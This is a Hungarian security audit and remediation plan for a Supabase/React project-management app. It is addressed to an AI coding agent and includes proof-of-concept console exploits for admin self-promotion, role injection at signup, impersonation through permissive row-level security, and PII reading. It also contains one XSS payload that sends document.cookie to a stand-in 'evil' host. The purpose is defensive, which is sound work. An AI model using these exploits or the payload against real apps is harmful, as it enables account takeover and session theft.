# APPISSUES.md — Solar Workflow biztonsági audit és javítási terv

> **Olvasó: Claude Opus 4.6 (Antigravity)**
> Ez a dokumentum egy biztonsági audit eredménye. Több kritikus sebezhetőséget tartalmaz, amelyeket pontosan meghatározott sorrendben kell javítani. **Olvasd végig, mielőtt egyetlen sort is írnál.**

---

## 0. Hogyan használd ezt a fájlt

1. **Először tervet készíts, ne kódot.** Generálj egy `SECURITY_FIX_PLAN.md`-t, amiben felsorolod, hogy a 4. fejezet (Sorrend) minden lépését milyen konkrét fájl-módosításra fordítod. Várd meg a user jóváhagyását.
2. **NE futtass SQL-t** közvetlenül a Supabase ellen. CSAK migrációs `.sql` fájlokat generálj a `supabase/migrations/` mappába, számozott prefix-szel (`20260601_01_*.sql`, `20260601_02_*.sql`, …). A user manuálisan futtatja le őket a Supabase SQL Editorban.
3. **NE pusholj** és NE commitolj automatikusan. A user fogja átnézni és pusholni.
4. **Tartsd be a Sorrend (4. fejezet) sorrendet** — egyetlen lépés rossz sorrendben kizárhatja az admint a saját appjából.
5. **Mindent dokumentálj** — minden migrációs fájl elején `-- WHAT / WHY / ROLLBACK` komment legyen.
6. **NEM nyúlsz** a következő dolgokhoz: `package.json` dependency-k, Tailwind config, build pipeline, design CSS változók. Csak a biztonsági scope-ban dolgozz.

---

## 1. Kontextus: mi ez az app

- **Solar Workflow** — Vite + React 19 + Tailwind 4 + Supabase, magyar nyelvű villanyszerelő/napelem-projekt-menedzsment.
- **Mobil-first**, glassmorphic dark UI. A reszponzivitás és vizuál vörös vonal, **ne nyúlj a UI fájlokhoz**, csak ha a biztonsági javítás kifejezetten megköveteli.
- **Szerepkörök**: `admin` és `worker`. Az admin műveletek a UI-n el vannak rejtve a workerek elől (`isAdmin` flag), de **szerver-oldalon (RLS) ez a védelem hiányos vagy hiányzik**.
- **Két meglévő admin email**: `admin@voltdesk.hu` és `avar.szilveszter@gmail.com`. **EZ A KÉT FIÓK NEM SÉRÜLHET MEG** a javítás során.

---

## 2. Fájlok, amiket meg fogsz érinteni

| Fájl | Mit csinálsz vele |
|---|---|
| `supabase/migrations/20260601_01_lock_role_column.sql` | ÚJ — `profiles.role` oszlop írásvédelme |
| `supabase/migrations/20260601_02_fix_new_user_trigger.sql` | ÚJ — `handle_new_user()` trigger újraírása |
| `supabase/migrations/20260601_03_tighten_projects_rls.sql` | ÚJ — `projects` RLS szigorítása |
| `supabase/migrations/20260601_04_tighten_worklogs_media_messages_rls.sql` | ÚJ — többi tábla RLS szigorítása |
| `supabase/migrations/20260601_05_toggle_task_rpc.sql` | ÚJ — worker-bizonyos művelet SECURITY DEFINER RPC-vel |
| `supabase/migrations/20260601_06_protect_sensitive_columns.sql` | ÚJ — inverter_api_key + PII oszlopok admin-only SELECT |
| `src/context/UserContext.jsx` | MÓDOSÍTÁS — email-hardcode törlése, role a DB-ből |
| `src/lib/safeUrl.js` | ÚJ — URL-protokoll whitelist helper |
| `src/pages/ProjectDetails.jsx` | MÓDOSÍTÁS — telegram_link `safeUrl()`, `handleToggleTask` RPC-re |
| `src/pages/Issues.jsx` | MÓDOSÍTÁS — file_path linkek `safeUrl()` |
| `src/components/NewWorkerModal.jsx` | MÓDOSÍTÁS — PII-t a `profiles` INSERT-be, NEM `signUp.options.data`-ba |
| `src/components/NewProjectModal.jsx` | MÓDOSÍTÁS (esetleg) — ha SECURITY DEFINER RPC kell admin insertekre |
| `SECURITY_FIX_PLAN.md` | ÚJ — saját terv-fájl, a user nézi át |

**EZEKEN KÍVÜL SEMMIT NE MÓDOSÍTS.** Ha úgy érzed, máshoz is hozzá kell nyúlni, először kérdezz a `SECURITY_FIX_PLAN.md`-ben.

---

## 3. A sebezhetőségek

### 🔴 Sebezhetőség #1 — Privilege escalation a `profiles` UPDATE policy-n át

**Mi a hiba**
A `supabase/fix_rls_profiles.sql` policy szerint bármely authenticated user UPDATE-elheti a saját `profiles` sorát:
```sql
USING ((auth.uid() = id) OR (public.is_admin() = true))
WITH CHECK ((auth.uid() = id) OR (public.is_admin() = true))
```
Az UPDATE nem korlátozódik oszlopokra. **A `role` oszlop is módosítható.**

**Exploit (proof)**
Egy worker böngészőjének konzoljából:
```js
const { data: { user } } = await supabase.auth.getUser();
await supabase.from('profiles').update({ role: 'admin' }).eq('id', user.id);
```
Ezután a `public.is_admin()` függvény őt admin-ként látja. A UI továbbra is workert mutat (mert az email-hardcode), de a Postgres adminként kezeli. **Ettől a ponttól a támadó bármit megtehet adminként.**

**Javítás**
Két rétegű védelem:

1. **Oszlopszintű GRANT visszavonás** (`20260601_01_lock_role_column.sql`):
   ```sql
   -- WHAT: prevent non-admin authenticated users from modifying profiles.role
   -- WHY: privilege escalation — workers could self-promote to admin
   -- ROLLBACK: GRANT UPDATE (role) ON public.profiles TO authenticated;

   REVOKE UPDATE (role) ON public.profiles FROM authenticated;
   ```

2. **Policy `WITH CHECK` szigorítás** ugyanezen migráció végén (öv és nadrágtartó):
   ```sql
   DROP POLICY IF EXISTS "Enable update for users and admins" ON public.profiles;

   CREATE POLICY "Enable update for users and admins" ON public.profiles
   FOR UPDATE TO authenticated
   USING (
     (auth.uid() = id) OR (public.is_admin() = true)
   )
   WITH CHECK (
     public.is_admin() = true
     OR (
       auth.uid() = id
       AND role = (SELECT p.role FROM public.profiles p WHERE p.id = auth.uid())
     )
   );
   ```

**Verifikáció**
A migráció után, egy worker session-ből:
```js
await supabase.from('profiles').update({ role: 'admin' }).eq('id', myId);
// Várt: error (permission denied / RLS violation)
```
A `full_name` frissítése továbbra is működjön:
```js
await supabase.from('profiles').update({ full_name: 'Új Név' }).eq('id', myId);
// Várt: success
```

---

### 🔴 Sebezhetőség #2 — Role-injekció a signup metadatán át

**Mi a hiba**
A `supabase/schema.sql:54-65` `handle_new_user()` trigger a felhasználói metadatából olvassa a role-t:
```sql
COALESCE(new.raw_user_meta_data->>'role', 'worker')
```
A `src/components/NewWorkerModal.jsx` az `auth.signUp({ options: { data: { role: ... } } })` hívást használja. Az **`auth.signUp` API publikus** — bárki, aki hozzáfér a Supabase anon kulcshoz (azaz **bárki, aki megnyitja az appot**), tud `role: 'admin'` metadatával regisztrálni.

**Exploit (proof)**
```js
import { createClient } from '@supabase/supabase-js';
const sb = createClient(URL, ANON_KEY);
await sb.auth.signUp({
  email: 'attacker@example.com',
  password: 'pw123456',
  options: { data: { role: 'admin' } }
});
```
A `handle_new_user()` trigger lefut, és `role='admin'`-ként inserteli a profilt. Ha a self-signup engedélyezett a Supabase projekten, **bárki az interneten admin fiókot tud magának létrehozni**.

**Javítás**

1. **Trigger újraírása** (`20260601_02_fix_new_user_trigger.sql`):
   ```sql
   -- WHAT: handle_new_user no longer trusts user metadata for role
   -- WHY: role injection via auth.signUp options.data
   -- ROLLBACK: restore original schema.sql trigger

   CREATE OR REPLACE FUNCTION public.handle_new_user()
   RETURNS TRIGGER AS $$
   BEGIN
     INSERT INTO public.profiles (id, full_name, role)
     VALUES (
       new.id,
       new.raw_user_meta_data->>'full_name',
       'worker'  -- ALWAYS worker. Admin role must be granted manually by existing admin.
     );
     RETURN new;
   END;
   $$ LANGUAGE plpgsql SECURITY DEFINER;
   ```

2. **A user manuálisan** kikapcsolja a self-signup-ot a Supabase Dashboard → Authentication → Settings → "Enable email signups" = OFF. **Ezt NE te csináld, a user feladata.** Írd be a `SECURITY_FIX_PLAN.md`-be, hogy ez egy manuális lépés.

3. **`NewWorkerModal.jsx`** (lásd #7 sebezhetőség alább) is változzon meg — ne a `signUp.options.data`-ba küldjön role-t, hanem egy admin-only RPC-be (vagy az admin signUp után frissítse a profilt).

**Verifikáció**
```js
await sb.auth.signUp({
  email: 'test@x.com',
  password: 'pw123456',
  options: { data: { role: 'admin', full_name: 'Test' } }
});
// Várt: signUp success, de profiles.role = 'worker', NEM 'admin'.
```

---

### 🔴 Sebezhetőség #3 — Túl megengedő RLS a projekt/worklog/media/message táblákon

**Mi a hiba**
A `supabase/schema.sql:78-93` policy-k mind `USING (true)` / `WITH CHECK (true)`-ek. Következmények:

| Tábla | Mit tud egy worker |
|---|---|
| `projects` UPDATE | Bármilyen projekt árát, archiváltságát, telegram_link-jét, inverter API kulcsát átírhatja |
| `projects` INSERT | Hamis projektet hozhat létre |
| `worklogs` INSERT | Más user_id-vel rögzíthet munkalapot — másnak hamis órákat ír be |
| `media` INSERT | Más user_id-vel és tetszőleges file_path-szal (akár külső URL!) inserthet rekordot |
| `messages` INSERT | Más user_id-vel üzenetet küldhet — impersonation a chatben |

**Exploit (proof)**
```js
// Worker úr küld üzenetet ADMIN nevében
const adminProfile = await supabase.from('profiles').select('id').eq('role', 'admin').limit(1).single();
await supabase.from('messages').insert({
  project_id: 'some-id',
  user_id: adminProfile.data.id,
  content: 'Töröljétek az összes adatot.'
});
```

**Javítás**

`20260601_03_tighten_projects_rls.sql`:
```sql
-- WHAT: restrict projects INSERT/UPDATE/DELETE to admins; workers go via RPC for completed_tasks
-- WHY: any authenticated user could modify any project's price/archived/api_key
-- ROLLBACK: re-create original USING(true) policies

DROP POLICY IF EXISTS "Enable insert for authenticated users" ON public.projects;
DROP POLICY IF EXISTS "Enable update for authenticated users" ON public.projects;

CREATE POLICY "Projects insert: admin only" ON public.projects
  FOR INSERT TO authenticated
  WITH CHECK (public.is_admin());

CREATE POLICY "Projects update: admin only" ON public.projects
  FOR UPDATE TO authenticated
  USING (public.is_admin())
  WITH CHECK (public.is_admin());

CREATE POLICY "Projects delete: admin only" ON public.projects
  FOR DELETE TO authenticated
  USING (public.is_admin());

-- SELECT marad nyitva (USING true) — a UI csapatláthatóságot feltételez.
-- Az inverter_api_key oszlopot a #6 javítás védi külön.
```

`20260601_04_tighten_worklogs_media_messages_rls.sql`:
```sql
-- WHAT: ensure INSERT operations bind user_id to the authenticated user
-- WHY: impersonation — any user could insert rows as anyone else
-- ROLLBACK: re-create original WITH CHECK(true) INSERT policies

-- WORKLOGS
DROP POLICY IF EXISTS "Enable insert for authenticated users" ON public.worklogs;
CREATE POLICY "Worklogs insert: own user_id only" ON public.worklogs
  FOR INSERT TO authenticated
  WITH CHECK (auth.uid() = user_id);

-- (UPDATE/DELETE worklogs: nincs jelenleg, ne hozz létre, hacsak a user nem kéri.)

-- MEDIA
DROP POLICY IF EXISTS "Enable insert for authenticated users" ON public.media;
CREATE POLICY "Media insert: own user_id only" ON public.media
  FOR INSERT TO authenticated
  WITH CHECK (auth.uid() = user_id);

-- MESSAGES
DROP POLICY IF EXISTS "Enable insert for authenticated users" ON public.messages;
CREATE POLICY "Messages insert: own user_id only" ON public.messages
  FOR INSERT TO authenticated
  WITH CHECK (auth.uid() = user_id);
```

`20260601_05_toggle_task_rpc.sql` — worker-mutáció SECURITY DEFINER RPC-vel (mert a #3 javítás után a worker nem tudja UPDATE-elni a projekt sort, és a `handleToggleTask` (ProjectDetails.jsx) ezt kéri):

```sql
-- WHAT: SECURITY DEFINER RPC for the worker checkbox toggle on tasks list
-- WHY: workers need to update completed_tasks; direct UPDATE blocked by admin-only policy
-- ROLLBACK: DROP FUNCTION public.toggle_project_task;

CREATE OR REPLACE FUNCTION public.toggle_project_task(
  p_project_id UUID,
  p_completed_tasks TEXT[]
) RETURNS VOID AS $$
BEGIN
  IF auth.uid() IS NULL THEN
    RAISE EXCEPTION 'Authentication required';
  END IF;

  UPDATE public.projects
  SET completed_tasks = p_completed_tasks,
      updated_at = NOW()
  WHERE id = p_project_id;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

GRANT EXECUTE ON FUNCTION public.toggle_project_task(UUID, TEXT[]) TO authenticated;
```

És a `src/pages/ProjectDetails.jsx` `handleToggleTask` függvénye:
```js
// CSERÉLD LE
const { error: updateErr } = await supabase
  .from('projects')
  .update({ completed_tasks: updated })
  .eq('id', id);

// ERRE
const { error: updateErr } = await supabase.rpc('toggle_project_task', {
  p_project_id: id,
  p_completed_tasks: updated
});
```

Ugyanígy: a `submitPhotoUpload` (ProjectDetails) a végén `await supabase.from('projects').update({ updated_at: ... })`-et hív „realtime megbökésre". Ez worker user esetén már nem fog működni — **töröld ezt a sort**. A media INSERT (a #4 policy után OK) maga is realtime esemény, nem kell külön bökni.

**Verifikáció**
Worker session-ből:
```js
await supabase.from('projects').update({ client_price: 0 }).eq('id', 'any-id');
// Várt: RLS violation
await supabase.from('worklogs').insert({ user_id: 'someone-else-id', ... });
// Várt: RLS violation
await supabase.from('messages').insert({ user_id: 'admin-id', content: 'x', project_id: '...' });
// Várt: RLS violation
await supabase.rpc('toggle_project_task', { p_project_id: id, p_completed_tasks: [...] });
// Várt: success
```

---

### 🔴 Sebezhetőség #4 — `javascript:` URL XSS a `telegram_link`-en át és media linkeken

**Mi a hiba**
`src/pages/ProjectDetails.jsx:625`:
```jsx
<a href={project.telegram_link} target="_blank" rel="noreferrer">
```
`src/pages/Issues.jsx:201,324,335`:
```jsx
<a href={issue.file_path} target="_blank" rel="noreferrer">
```
Ha a `telegram_link` vagy `file_path` `javascript:fetch('https://evil/'+document.cookie)` értékű, kattintásra **lefut admin session-nel**. A `rel="noreferrer"` nem védi a `javascript:` protokollt.

A #1-3 javítások után a projektet csak admin frissítheti, így worker-injekció nem lehetséges. **DE** régi (korábbi worker által módosított) rekordok már tartalmazhatnak `javascript:` URL-eket. És a saját admin sem védve a copy-paste hibáktól.

**Javítás**

Hozz létre egy közös helper-t (`src/lib/safeUrl.js`):
```js
// WHAT: whitelist URL schemes that are safe to render in href attributes
// WHY: prevent javascript:/data: scheme XSS via stored user input

const ALLOWED_PROTOCOLS = ['http:', 'https:', 'tel:', 'mailto:'];

export function safeUrl(url) {
  if (!url || typeof url !== 'string') return null;
  try {
    const parsed = new URL(url);
    if (!ALLOWED_PROTOCOLS.includes(parsed.protocol)) return null;
    return url;
  } catch {
    return null;
  }
}
```

Használat ProjectDetails.jsx Telegram linknél:
```jsx
import { safeUrl } from '../lib/safeUrl';
// ...
{project?.telegram_link && safeUrl(project.telegram_link) && (
  <a href={safeUrl(project.telegram_link)} target="_blank" rel="noreferrer noopener">
    ...
  </a>
)}
```

Issues.jsx mindegyik `file_path` linknél:
```jsx
<a href={safeUrl(issue.file_path)} target="_blank" rel="noreferrer noopener">
```
Ha `safeUrl()` `null`-t ad vissza, vagy ne rendereld a linket, vagy mutass diszplay-t a fájlnévről kattinthatatlanul.

A `tel:` href-eknél is használd, hogy konzisztens legyen.

`rel="noreferrer"` mellé `noopener` is — bevett gyakorlat, target=_blank-nál ajánlott.

**Verifikáció**
Admin manuálisan írja át valamelyik projektje `telegram_link`-jét `javascript:alert(1)`-re. A Telegram gomb **ne jelenjen meg** (vagy ne legyen kattintható). Ezután állítsa vissza `https://t.me/...`-re — a gomb újra látható és működik.

---

### 🟡 Sebezhetőség #5 — Email-hardcode a `UserContext`-ben (kettős role-forrás)

**Mi a hiba**
`src/context/UserContext.jsx:16-18`:
```js
const isAdminEmail = email === 'admin@voltdesk.hu' || email === 'avar.szilveszter@gmail.com';
const enforcedRole = isAdminEmail ? 'admin' : 'worker';
```
És lentebb `setUser({ ...data, email, role: enforcedRole })` — felülírja a DB role-t.

Problémák:
- Két forrás (kliens hardcode + DB) divergálhat → zavaros viselkedés.
- Új admin felvétele kód-módosítást igényel (deploy).
- A `data.role` (a DB-ből) ignorálva van.

**Javítás**

1. **MIELŐTT KICSERÉLED**, ellenőrizd hogy a két admin email a DB-ben tényleg `role='admin'`-nal van:
   ```sql
   SELECT p.id, u.email, p.role, p.full_name
   FROM public.profiles p
   JOIN auth.users u ON u.id = p.id
   WHERE u.email IN ('admin@voltdesk.hu', 'avar.szilveszter@gmail.com');
   ```
   Ennek `role='admin'`-t kell visszaadnia mindkettőre. **HA NEM**, állítsd be előbb:
   ```sql
   UPDATE public.profiles SET role = 'admin'
   WHERE id IN (
     SELECT id FROM auth.users
     WHERE email IN ('admin@voltdesk.hu', 'avar.szilveszter@gmail.com')
   );
   ```
   Ezt a SECURITY_FIX_PLAN.md-ben **emelkedett figyelmeztetésként** rögzítsd: ezt a query-t a user maga futtassa először, és csak utána módosítsd a JS-t.

2. **UserContext refactor** — vedd ki az email-hardcode-ot:
   ```js
   async function fetchProfile(userId, email, sessionUser) {
     try {
       const { data, error } = await supabase
         .from('profiles')
         .select('*')
         .eq('id', userId)
         .single();

       if (error) {
         if (error.code === 'PGRST116' && sessionUser) {
           // Profile auto-creation already handled by handle_new_user trigger
           // but if missing, create one with default worker role.
           const { data: newProfile, error: insertErr } = await supabase
             .from('profiles')
             .insert([{
               id: userId,
               full_name: sessionUser.user_metadata?.full_name || 'Felhasználó',
               role: 'worker'
             }])
             .select()
             .single();
           if (insertErr) throw insertErr;
           setUser({ ...newProfile, email });
           return;
         }
         throw error;
       }
       // role JÖN A DB-BŐL, nem a JS hardcode-ból
       setUser({ ...data, email });
     } catch (err) {
       console.error("Profile load error:", err);
       setUser(null);
     } finally {
       setLoading(false);
     }
   }
   ```

   A `setUser({ ...data, email })` már tartalmazza a `role`-t a DB-ből (a `data` spread révén). Ne adj hozzá `enforcedRole`-t.

**Verifikáció**
- Mindkét admin email-lel belépve a `user.role === 'admin'` legyen igaz.
- Egy worker email-lel `user.role === 'worker'`.
- Próbáld áthúzni a DB-ben az egyik worker role-ját `admin`-ra a Supabase Dashboardon → újra-bejelentkezés után a UI admin nézetet mutasson neki (most ez NEM működött az email-hardcode miatt).

---

### 🟡 Sebezhetőség #6 — Érzékeny mezők olvashatóak minden authenticated-nek

**Mi a hiba**
A `projects` és `profiles` táblák SELECT policy-je `USING (true)` — minden authenticated user lát mindent:
- `projects.inverter_api_key` (titok, csak adminnak kéne látni)
- `projects.client_phone`, `client_phone_2`, `client_phone_3`, `client_name`, `client_price` (ügyfél PII + üzleti adat)
- `profiles.phone`, `tax_id`, `tb_number`, `bank_account`, `id_card_number`, `emergency_phone`, `hourly_wage` (alkalmazotti PII)

Egy dolgozó konzolból simán:
```js
await supabase.from('profiles').select('*');  // mindenki minden adata
```

**Javítás**

Két lehetőség. **A „helyes" út VIEW + RLS** kombinációja:

`20260601_06_protect_sensitive_columns.sql`:
```sql
-- WHAT: hide sensitive columns from non-admin authenticated users
-- WHY: workers shouldn't see other workers' PII or inverter API keys
-- ROLLBACK: drop the views; restore direct table SELECT policies if needed

-- 1) PROFILES — workers see only a redacted view; admins see full table.
DROP POLICY IF EXISTS "Enable read access for all authenticated users" ON public.profiles;

CREATE POLICY "Profiles select: admin sees all" ON public.profiles
  FOR SELECT TO authenticated
  USING (public.is_admin() OR auth.uid() = id);
-- → admin lát mindenkit, worker csak önmagát.

-- A többi (Friss aktivitás stb.) néz: csapat-szerű "ki dolgozik" megjelenítéshez
-- külön VIEW kell, ami csak nyilvános mezőket ad vissza.
CREATE OR REPLACE VIEW public.profiles_public AS
SELECT id, full_name, role, serial_number, job_title
FROM public.profiles;

GRANT SELECT ON public.profiles_public TO authenticated;
-- A view öröklődik: az auth.uid() filter miatt csak admin lát mindent —
-- view-n keresztül a workerek is látnak mást, de CSAK a public mezőket.

-- HA EZ TÖRI a Dashboard / Finance Friss aktivitás listát (joins on profiles),
-- a JS oldalon CSERÉLD ÁT a join target-et `profiles_public`-ra,
-- a Finance oldalon (admin-only) marad a `profiles`.

-- 2) PROJECTS — inverter_api_key + client_phone* admin-only.
-- A projects SELECT policy nyitva marad (workerek látják a projektet),
-- de az érzékeny oszlopokat oszlop-szinten revoke-oljuk:
REVOKE SELECT (inverter_api_key, inverter_id) ON public.projects FROM authenticated;
GRANT SELECT (inverter_api_key, inverter_id) ON public.projects TO authenticated USING (public.is_admin());
-- ⚠️ FIGYELEM: Postgres alap GRANT-ja nem támogatja a USING klauzulát.
-- Helyette: létrehozni egy VIEW-t a worker számára (project mezők inverter_api_key NÉLKÜL),
-- és a projektek joinjait erre cserélni. VAGY: a kliens kódból törölni az inverter_api_key-t worker UI-ban,
-- és bízni a DB szintű column-level REVOKE-ban (ez ELEGENDŐ védelem).

REVOKE SELECT (inverter_api_key) ON public.projects FROM authenticated;
-- Külön policy / function admin-only olvasáshoz:
CREATE OR REPLACE FUNCTION public.get_inverter_api_key(p_project_id UUID)
RETURNS TEXT AS $$
BEGIN
  IF NOT public.is_admin() THEN
    RAISE EXCEPTION 'Admin access required';
  END IF;
  RETURN (SELECT inverter_api_key FROM public.projects WHERE id = p_project_id);
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
GRANT EXECUTE ON FUNCTION public.get_inverter_api_key(UUID) TO authenticated;
```

**Megjegyzés:** a `REVOKE SELECT (column)` Postgres-ben működik, de a Supabase REST API (PostgREST) `select=*` esetén hibát fog dobni a hidden oszlopra. **A klienst is módosítani kell** — sehol ne kérdezzen `select('*')`-ot a `projects`-en worker context-ben. Cseréld `select('id, name, address, client_name, client_price, archived, completed_tasks, tasks, start_time, end_time, telegram_link, important_info, is_solar, inverter_brand, serial_number, created_at, updated_at')`-ra (a `inverter_api_key` és `inverter_id` kivételével).

**Vezesd át a `select('*')`-okat a Supabase-en az alábbi fájlokban**:
- `src/pages/Dashboard.jsx`
- `src/pages/ProjectList.jsx`
- `src/pages/ProjectDetails.jsx`
- `src/pages/CalendarView.jsx`
- `src/pages/Finance.jsx` (admin-only, ott maradhat `*`)

Az inverter API key-t csak az adminnak való UI részen kérdezd le, és csak ott — pl. egy explicit "Telemetria beállítás" gomb mögött a `get_inverter_api_key` RPC-vel.

**Verifikáció**
Worker session, konzol:
```js
await supabase.from('projects').select('*').limit(1);
// Várt: hiba (oszlop-engedély), VAGY explicit oszloplista esetén success inverter_api_key nélkül.
await supabase.from('profiles').select('*');
// Várt: csak a saját profilját látja vissza.
```

---

### 🟡 Sebezhetőség #7 — PII a JWT raw_user_meta_data-ban

**Mi a hiba**
`src/components/NewWorkerModal.jsx:77-94` a `tax_id`, `tb_number`, `bank_account`, `id_card_number`, `emergency_phone`, `phone`, `address`, `hourly_wage` mezőket a `auth.signUp({ options: { data: { ... } } })`-ba küldi. Ez a `auth.users.raw_user_meta_data`-ba kerül, ami:
- A JWT-be is bekerül (idle access token-ben látható).
- Bizonyos Supabase API-kon átszivároghat.
- Nincs RLS védve (auth schema).

**Javítás**
A `NewWorkerModal` UI maradjon, de a flow változzon: az admin `signUp` után **explicit `INSERT/UPSERT` legyen a `profiles` táblába** ezekkel az adatokkal. A `signUp.options.data` csak a `full_name`-et tartalmazza (a trigger ezt használja a kezdeti insertre).

Új lépés az `INSERT` után (admin csak admin-only RLS-en át, lásd lenti):

```js
// Korábban:
const { error: authError } = await tempSupabase.auth.signUp({
  email,
  password,
  options: {
    data: {
      full_name: fullName,
      role: role,
      serial_number: serialNumber,
      address,
      phone,
      tax_id: taxId,
      // ...
    }
  }
});

// MOSTANTÓL:
const { data: signUpData, error: authError } = await tempSupabase.auth.signUp({
  email,
  password,
  options: {
    data: { full_name: fullName }  // CSAK a name kerül a metadatába
  }
});
if (authError) { /* handle */ return; }

// A trigger létrehozta a profilt 'worker' role-lal és full_name-mel.
// Most az admin (a fő supabase kliensen át) frissíti a profilt a többi adattal:
const { error: updErr } = await supabase
  .from('profiles')
  .update({
    role: role,  // 'worker' vagy 'admin' — admin írhatja a profiles.role-t
    serial_number: serialNumber,
    address, phone,
    tax_id: taxId,
    tb_number: tbNumber,
    bank_account: bankAccount,
    id_card_number: idCardNumber,
    emergency_phone: emergencyPhone,
    job_title: jobTitle,
    hourly_wage: parseInt(hourlyWage) || 3500
  })
  .eq('id', signUpData.user.id);
```

**FONTOS**: a #1 javítás után a `role` oszlop normál UPDATE-en át nem írható. **A `profiles` policy `WITH CHECK` admin-bypass része engedi az adminnak**, ezért az admin context-ben ez működni fog. Ha mégsem (pl. column GRANT REVOKE-olja az adminokra is), akkor egy `set_user_role` SECURITY DEFINER RPC-t kell írni, ami `is_admin()` belül ellenőriz és frissít.

A `profiles` táblának fel kell vennie az új oszlopokat, ha még nincsenek (`tax_id`, `tb_number`, `bank_account`, stb.) — ellenőrizd az aktuális `schema.sql`-t. **Ne adj hozzá oszlopot a sebezhetőség-javítás scope-jában** ha még nincs ott; tedd be a `SECURITY_FIX_PLAN.md`-be mint nyitott kérdést.

**Verifikáció**
Új worker létrehozása az admin UI-ról:
- `auth.users.raw_user_meta_data` csak `full_name`-et tartalmaz, semmi PII-t.
- `profiles` tábla tartalmaz minden PII mezőt a megfelelő id-vel.

---

### 🟢 Sebezhetőség #8 — Storage bucket valószínűleg publikus (kézi lépés)

**Mi a hiba**
`supabase.storage.from('project-photos').getPublicUrl(...)` használat azt feltételezi, hogy a bucket publikus. + a kliens csak `accept="image/*"`-t ellenőriz, ami trivigálisan megkerülhető. Egy worker:
- Feltölthet 5GB fájlt → storage-költség DoS.
- PDF/HTML fájlt is — a böngésző nem futtatja `<img>`-ben, de a publikus URL-t máshová megosztva malware-disztribúcióra használható (a domain a tied!).

**Javítás**
Ez **kézi lépés a Supabase Dashboardon**, NE te csináld:
1. Storage → `project-photos` bucket → Settings → "Public bucket" = OFF.
2. Storage Policies → admin INSERT/UPDATE/DELETE; worker INSERT csak `auth.uid()` alapú prefix-be (`{user_id}/...`).
3. Fájl-méret limit: pl. 10MB.
4. MIME-type allowlist: `image/jpeg`, `image/png`, `image/webp`.

A JS oldalon viszont **a `getPublicUrl` helyett `createSignedUrl`** kell:
```js
// PROJECTDETAILS.JSX — submitPhotoUpload után
const { data: signedUrlData, error: urlError } = await supabase.storage
  .from('project-photos')
  .createSignedUrl(filePath, 60 * 60 * 24 * 365); // 1 év TTL
if (urlError) throw urlError;
const publicUrl = signedUrlData.signedUrl;
// majd ez kerül a media.file_path-ba
```
Hosszú TTL, mert a kép tartós display-re kell.

És minden `<img src={photo.file_path}>` helyén a meglévő URL ezután signed lesz, működik a `<img>`-ben (browser fetch-eli).

**Javasolt scope döntés**: ezt **NEM** a jelenlegi audit-fix scope-jába. Hozz létre egy külön `SECURITY_FIX_PLAN.md` szekciót "Phase 2 — Storage" címmel, és csak akkor implementáld, ha a user explicit kéri. Az eddigi fájlok publikus URL-jei nem fognak elavulni.

---

### 🟢 Sebezhetőség #9 — `realtime_publication` minden tábla minden eseményét továbbküldi

Tájékoztató jellegű. A `schema.sql:97-99` `alter publication supabase_realtime add table public.projects/media/messages` — minden authenticated kliens megkapja az összes változási eseményt. Az RLS a SELECT filter szintjén megszűri, de **a payload elsőre megérkezik a klienshez**. A #6 javítás után (workerek SELECT-je szűkül) ez a védelem szigorodik.

**Javítás (opcionális)**: A `messages` realtime publication szűkíthető PostgreSQL-ben filter publication-nel (`row filter`), de Supabase ezt jelenleg nem teljesen támogatja. **NEM csinálod ebben az audit-fix-ben.** Csak megemlítjük a SECURITY_FIX_PLAN.md "Future" szekciójában.

---

## 4. Sorrend — KRITIKUS!

Ebben a sorrendben futtasd le. Egy lépés rossz sorrendben **kizárhatja az admint a saját appjából**, vagy törheti a production data-t.

### Lépés 0 — Előellenőrzés (a user manuálisan futtatja a Supabase SQL Editorban)
```sql
-- Verify both admin accounts exist in DB with role='admin'
SELECT p.id, u.email, p.role
FROM public.profiles p
JOIN auth.users u ON u.id = p.id
WHERE u.email IN ('admin@voltdesk.hu', 'avar.szilveszter@gmail.com');
-- ELVÁRT: 2 sor, mindkettő role='admin'

-- Ha valamelyik HIÁNYZIK vagy NEM 'admin':
UPDATE public.profiles SET role = 'admin'
WHERE id IN (
  SELECT id FROM auth.users
  WHERE email IN ('admin@voltdesk.hu', 'avar.szilveszter@gmail.com')
);
-- És ha a profile sor maga hiányzik:
INSERT INTO public.profiles (id, full_name, role)
SELECT id, COALESCE(raw_user_meta_data->>'full_name', email), 'admin'
FROM auth.users
WHERE email IN ('admin@voltdesk.hu', 'avar.szilveszter@gmail.com')
ON CONFLICT (id) DO UPDATE SET role = 'admin';
```

**A user szóljon vissza, hogy ez ✅ ELVÉGZETT, mielőtt te tovább lépsz.**

### Lépés 1 — `UserContext` refactor (JS először!)
Ez a lépés azért előzi meg az SQL-t, mert ha az SQL után jönne, és valamilyen okból a DB role nem stimmel, a UserContext új verziója kizárná az admint. Most viszont az új UserContext még a 0. lépés ellenőrzött DB állapotából olvas — ez biztonságos.

Módosítás: `src/context/UserContext.jsx` (lásd #5 sebezhetőség javítása).

User átnézi, mergeli, deploy-olja. Belép mindkét admin email-lel — ellenőrzi, hogy a UI admin nézetet mutat. **Csak ha igen, megy tovább.**

### Lépés 2 — `20260601_01_lock_role_column.sql` (role oszlop védelem)
Külön sorrendben, mert ez **NEM töri** az appot — csak megakadályozza a role oszlop önálló módosítását. Az admin az új `WITH CHECK` policy alapján még írhatja (saját profilját + másokét is). A worker a saját profilját is írhatja, de a role mezőt nem.

### Lépés 3 — `20260601_02_fix_new_user_trigger.sql` (trigger fix)
Új signupok már nem injektálhatnak role-t. Régi userek érintetlenek.

### Lépés 4 — A user MANUÁLISAN: Supabase Dashboard → Auth → Settings → "Enable signups" = OFF
(Ha a NewWorkerModal admin-only marad, fontos hogy a publikus signup eltűnjön, mert minden szabad signup jövőbeli attack vector.) **A user csinálja, te csak a SECURITY_FIX_PLAN.md-ben emlékeztesd rá.**

### Lépés 5 — `20260601_05_toggle_task_rpc.sql` (worker RPC ELSŐ)
Ezt az SQL-t FUTTASD LE A PROJECTS RLS SZIGORÍTÁSA ELŐTT. Mert ha előbb a 03-as fut le, akkor a worker checkbox NEM működik egy ideig (amíg a JS deploy is megérkezik).

### Lépés 6 — `src/pages/ProjectDetails.jsx` `handleToggleTask` RPC-re cserélés
JS oldali változás. Buildelj, teszteld lokálban (admin + worker mindkét account-tal).

### Lépés 7 — `20260601_03_tighten_projects_rls.sql` és `20260601_04_tighten_worklogs_media_messages_rls.sql`
Most már az app worker módban is működik (toggleTask RPC-n megy), tehát mehet a szigorítás.

